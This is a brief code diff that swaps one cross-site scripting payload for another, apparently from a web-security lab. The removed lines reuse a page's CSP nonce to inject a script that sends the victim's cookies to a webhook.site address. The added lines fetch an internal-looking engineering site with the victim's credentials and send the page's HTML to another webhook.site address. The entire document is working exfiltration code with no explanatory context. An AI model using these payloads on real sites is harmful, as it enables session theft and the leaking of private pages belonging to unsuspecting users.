@@ -1,5 +1,5 @@
-const legitNonce = document.currentScript.nonce;
-const s = document.createElement('script');
-s.nonce = legitNonce;
-s.textContent = `new Image().src = 'https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + encodeURIComponent(document.cookie)`;
-document.head.appendChild(s);
+fetch('https://engineering.quoccacorp.com/', { credentials: 'include' })
+  .then(r => r.text())
+  .then(html => {
+    fetch('https://webhook.site/a6ecea9b-2db7-48d5-9d18-86c6f8050304/?data=' + encodeURIComponent(html));
+  });
